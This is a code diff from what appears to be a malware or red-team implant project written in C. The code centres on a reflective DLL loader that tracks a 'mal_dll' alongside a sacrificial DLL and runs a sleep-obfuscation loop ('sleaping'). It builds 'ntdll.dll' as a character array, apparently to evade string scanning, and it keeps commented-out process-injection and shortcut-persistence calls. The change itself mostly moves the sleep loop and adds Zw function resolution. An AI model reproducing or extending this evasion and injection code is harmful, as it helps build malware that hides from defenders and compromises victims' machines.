@@ -15,15 +15,6 @@
 #include "dll_headers.h"
 #include "ldr.h"
 
-typedef struct _SAC_DLL_HEADER
-{
-	HANDLE sac_dll_handle;
-	HANDLE mal_dll_handle;
-	SIZE_T payload_size;
-	PBYTE to_free;
-
-} SAC_DLL_HEADER, * PSAC_DLL_HEADER;
-
 static uintptr_t resolve_jmp_to_actual_function(void* func_addr)
 {
 	if (!func_addr) return 0;
@@ -56,7 +47,6 @@ static uintptr_t resolve_jmp_to_actual_function(void* func_addr)
 
 	return (uintptr_t)func_addr;
 }
-
 
 EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 {
@@ -644,7 +634,6 @@ static status_t custom_process_attach(HMODULE hModule)
 {
 	status_t status = 0;
 	sleaping_para_t sleaping_para = { 0 };
-	//sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs
 
 	PSAC_DLL_HEADER sac_dll_header = NULL;
 
@@ -692,6 +681,22 @@ static status_t custom_process_attach(HMODULE hModule)
 	sleaping_para.view_size = sac_dll_size;
 	sleaping_para.nt = &nt_funcs;
 
+	do
+	{
+		MessageBoxA(NULL, "swappala", "swappala", MB_ICONERROR);
+		status = sleaping(&sleaping_para);
+		if (ST_FAILED(status))
+		{
+			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+			break;
+		}
+	} while (true);
+
+
+
+	WCHAR str_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
+	retrieve_zw_func_s(GMHR(str_ntdll), g_zw_functions);
+
 
 	//if (create_shortcut(&ole32_funcs) != ST_SUCCESS)
 	//	return FALSE;
@@ -706,18 +711,6 @@ static status_t custom_process_attach(HMODULE hModule)
 
 	//inject(&nt_funcs, str_target);
 
-
-
-	do
-	{
-		//MessageBoxA(NULL, "swappala", "swappala", MB_ICONERROR);
-		status = sleaping(&sleaping_para);
-		if (ST_FAILED(status))
-		{
-			//MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
-			break;
-		}
-	} while (true);
 
 
 
